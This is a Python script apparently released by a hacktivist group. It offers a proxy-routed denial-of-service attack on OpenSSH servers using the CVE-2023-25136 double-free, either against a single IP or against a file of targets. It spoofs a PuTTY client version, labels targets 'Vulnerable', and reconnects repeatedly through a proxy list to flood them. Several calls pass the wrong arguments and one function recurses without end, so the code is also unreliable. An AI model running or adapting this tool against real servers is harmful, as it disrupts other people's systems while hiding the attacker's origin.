import paramiko
import socket
import argparse
from colorama import init, Fore, Style
import os

class SSHVulnerabilityChecker:
    def __init__(self, client_id):
        self.client_id = client_id

    def read_proxies(self):
        with open('proxy.txt', 'r') as file:
            lines = file.readlines()
        proxies = []
        for line in lines:
            line = line.strip()
            if line:
                parts = line.split(':')
                if len(parts) == 2:
                    proxies.append((parts[0], int(parts[1])))
        return proxies

    def startAgain(self, ip, port):
        proxies = self.read_proxies()
        for proxy_ip, proxy_port in proxies:
            try:
                proxy = paramiko.ProxyCommand(f'ssh -W {ip}:{port} {proxy_ip} -p {proxy_port}')
                transport = paramiko.Transport(ip, port, proxy)
                transport.local_version = f"SSH-2.0-{self.client_id}"
                transport.connect(username='', password='')
                transport.close()
                self.startAgain(ip, port)
            except KeyboardInterrupt:
                print(Fore.CYAN + '[!] - ' + Fore.RED + 'Exit key pressed, exiting.' + Style.RESET_ALL)
            except Exception as e:
                print(Fore.CYAN + '[!] - ' + Fore.YELLOW + f'{ip}: ' + Fore.RED + f'Proxy {proxy_ip}:{proxy_port} failed with error {e}' + Style.RESET_ALL)
        print(Fore.CYAN + '[!] - ' + Fore.RED + 'All proxies failed, exiting.' + Style.RESET_ALL)

    def check_vulnerability(self, ip, port):
        try:
            transport = paramiko.Transport(ip, port)
            transport.local_version = f"SSH-2.0-{self.client_id}"
            transport.connect(username='', password='')
            print(Fore.CYAN + '[✓] - ' + Fore.YELLOW + f'{ip}: ' + Fore.GREEN + 'Target Vulnerable!' + Style.RESET_ALL)
            transport.close()
            self.startAgain()
        except (socket.error, paramiko.AuthenticationException, paramiko.SSHException):
            print(Fore.CYAN + '[!] - ' + Fore.YELLOW + f'{ip}: ' + Fore.RED + 'Not Vulnerable!' + Style.RESET_ALL)
            print(Fore.CYAN + '[!] - ' + Fore.RED + 'Exiting.' + Style.RESET_ALL)
        except KeyboardInterrupt:
                print(Fore.CYAN + '[!] - ' + Fore.RED + 'Exit key pressed, exiting.' + Style.RESET_ALL)

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
        {Fore.RED}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.RED}

            ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
            ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
            ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
            ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
            ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                                        
        {Fore.RED}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.YELLOW}  
                                                        Coded by Vip3r_Li0n
                                [+] Perform DoS Using OpenSSH Double-Free Method With Proxy List [+]
                                        [!] Script will check if target vulnerable first [!]
                                                        [+] CVE-2023-25136 [+]
                                                    
                                                    Forum: https://dragonforce.io
                                                Github: https://github.com/Vip3rLi0n
                                            Telegram: https://telegram.me/DragonForceIO
        {Fore.RED}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}""")
    init()
    parser = argparse.ArgumentParser(description='\n' + Fore.MAGENTA + 'Check SSH vulnerability on one or multiple IP addresses.' + Style.RESET_ALL)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-i', '--ip', metavar='IP_ADDRESS', help='\n' + Fore.GREEN + 'IP address to test for vulnerability.' + Style.RESET_ALL)
    group.add_argument('-f', '--file', metavar='FILE_NAME', help='\n' + Fore.GREEN + 'File name containing a list of IP addresses to test for vulnerability.' + Style.RESET_ALL)
    sshport = parser.add_mutually_exclusive_group(required=True)
    sshport.add_argument('-p', '--port', metavar='PORT_NUMBER', type=int, default=22, help='\n' + Fore.GREEN + 'SSH port to use (default: 22).' + Style.RESET_ALL)
    args = parser.parse_args()

    client_id = "PuTTY_Release_0.64"
    checker = SSHVulnerabilityChecker(client_id)

    if args.ip:
        checker.check_vulnerability(args.ip, args.port)
    else:
        file_name = args.file
        with open(file_name, 'r') as f:
            for line in f:
                ip = line.strip()
                checker.check_vulnerability(ip)